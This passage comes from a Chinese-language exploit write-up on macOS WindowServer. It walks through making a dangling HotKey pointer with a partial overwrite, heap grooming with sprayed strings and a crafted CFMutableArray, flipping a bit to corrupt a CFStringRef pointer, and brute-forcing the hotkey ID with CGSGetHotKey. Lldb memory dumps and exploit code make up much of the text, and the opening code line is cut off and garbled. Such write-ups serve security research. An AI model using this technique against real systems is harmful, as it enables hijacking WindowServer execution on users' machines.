    {
        for(int i = 1; i ------------------------------------------------------------------------------------------------------next的值从0x7fd15cfa8730改为0x7fd100005413。通过进行部分覆盖，我们强行创建一个悬空的HotKey指针。
经过漫长而艰巨的跋涉，第二阶段的工作终于接近尾声。现在，WindowServer的堆布局如下所示：
第二阶段结束时WindowServer堆的布局
最后一步是精确定位悬空的HotKey分配空间与喷射的NULL字符串的分配空间重叠的位置。
我们可以通过CGSSetHotKeyEnabled()来尝试启用悬空的HotKey（ID为0）。这个API会在悬空的HotKey分配空间中翻转一个位，“破坏”我们的喷射的一个NULL字符串。
    (lldb) x/10gx 0x00007fd100005413
    0x7fd100005413: 0x0000000000000000 0x0000000000000000
    0x7fd100005423: 0x0000000000000000 0x0000000000000000
    0x7fd100005433: 0x0000000000000001 0x0000000000000000 enabled
    0x7fd100005443: 0x0000000000000000 0x0000000000000000
    0x7fd100005453: 0x0000000000000000 0x0000000000000000
最后，我们再次使用CGSCopyConnectionProperty()从WindowServer中逐一检索喷射的属性字符串。最终，漏洞利用代码会找到包含单个翻转位的字符串。现在，我们已经确定出喷射的哪个分配空间与悬空的HotKey相互重叠了。
**数组风水**
* * *
第三阶段与前一阶段一样，也非常冗长乏味。创建了悬空的HotKey后，接下来的目标是在它下面分配一些“有趣”的东西。如果做得好，我们至少可以破坏一个位或从悬空的HotKey下面泄漏一些信息。当然，说起来简单做起来难，原因如下所示：
  * 悬空的HotKey始终与存储器的奇数地址对齐（例如，0xXXXXXXXXXX13）
  * 悬空的HotKey中的next字段（一个指针）的值必须为NULL（或其他有效地址）
  * 从8字节对齐角度看，CGSSetHotKeyEnabled()翻转的是第24位（0x1000000）
为了简洁起见，直接说结果吧——我们发现，一个精心设计、精心分配和精确对齐且填充了"我们感兴趣的"CFStringRef指针的CFMutableArray，既可以满足重叠HotKey的要求，又可以整理出劫持代码执行的路径。
如果重叠得当，对应的各个分配空间的布局将如下所示：
    (lldb) x/30gx 0x7fd1000053f0
    0x7fd1000053f0: 0x001dffff91812a79 0x0000000100001384 \ 
    0x7fd100005300: 0x0000000000000018 0x0000000000000000  \
    0x7fd100005410: 0x0000000000000000 0x0000000000000000   \
    0x7fd100005420: 0x00000001bd7bb000 0x0000000000434335    |
    0x7fd100005430: 0x00000001bd7bb000 0x0000000000434335    |
    0x7fd100005440: 0x00000001bd7bb000 0x0000000000434335    |
    0x7fd100005450: 0x0000000000434335 0x00000001bd7bb000    | 
    0x7fd100005460: 0x00000001bd7bb000 0x0000000000434335    +- CFMutableArray
    0x7fd100005470: 0x0000000000434335 0x0000000000434335    |
    0x7fd100005480: 0x0000000000434335 0x0000000000434335    |
    0x7fd100005490: 0x0000000000434335 0x0000000000434335    |
    0x7fd1000054a0: 0x0000000000434335 0x0000000000434335    |
    0x7fd1000054b0: 0x0000000000434335 0x0000000000434335   /
    0x7fd1000054c0: 0x0000000000434335 0x0000000000434335  /
    0x7fd1000054d0: 0x0000000000434335 0x0000000000434335 /
    (lldb) x/10gx 0x7fd100005413
    0x7fd100005413: 0x0000000000000000 0x7bb0000000000000 \ 
    0x7fd100005423: 0x43433500000001bd 0x7bb0000000000000  \
    0x7fd100005433: 0x43433500000001bd 0x7bb0000000000000   +- dangling hotkey
    0x7fd100005443: 0x43433500000001bd 0x4343350000000000  /
    0x7fd100005453: 0x7bb0000000000000 0x7bb00000000001bd /
需要注意的是，这些单独的内存转储描述的是相同的地址范围；与此同时，我们还提供了一个额外的可视化表示，以帮助解释它们在重叠时的采用的独特对齐方式：
重叠的分配空间的字节级表示及其相关字段
我们已经有效地将悬空的HotKey的hotkey->next字段与CFMutableArray头部中的两个NULL字段重叠在一起了。我们还精心制作了一个数组，使得CFStringRef正好位于我们可以通过CGSSetHotKeyEnabled()打开或关闭的单个比特位的下面。
这种精确对齐允许我们破坏CFMutableArray中的CFStringRef成员指针。
**破坏CFStringRef**
* * *
在破坏重叠的CFStringRef指针之前，首先必须找到悬空的HotKey的“新”ID。为了使用CoreGraphics/SkyLight
API，我们需要一个HotKey ID：悬空的HotKey ID已经不是ID 0了，因为hotkey->id与部分数组内容是重叠的。
解决方案是暴力搜索hotkey->id字段（~12bit
bf），该字段与数组结构中CFStringRef指针的底部3个字节重叠。我们使用CGSGetHotKey()API来暴力搜索悬空的HotKey
ID，直到它返回成功的结果代码为止：
    for(uint64_t i = 0; i < 0x1000; i++)
    {
        bf_hotkey_id = i << 52;
        result = CGSGetHotKey(g_cid, bf_hotkey_id, &leak1, &leak2, &leak3);
        if(result == 0)
        {
            printf("[+] Found overlaid hotkey id 0x%llx\n", bf_hotkey_id);
            *hotkey_id = bf_hotkey_id;